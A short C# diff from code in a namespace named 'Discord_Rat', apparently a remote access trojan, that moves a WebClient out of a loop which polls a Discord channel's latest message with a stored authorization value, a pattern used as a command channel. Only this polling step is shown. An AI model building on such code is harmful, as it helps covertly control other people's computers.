@@ -25,10 +25,9 @@ namespace Discord_Rat
         {
             name = Environment.UserName;
             Start();
+            WebClient webby = new WebClient();
             while (true)
             {
-               
-                WebClient webby = new WebClient();
                 webby.Proxy = null;
                 webby.Headers["Authorization"] = value;
                 data = webby.DownloadString($"https://discordapp.com/api/v6/channels/{cID}/messages?limit=1"); //Gets the last message sent in a Specific Channel
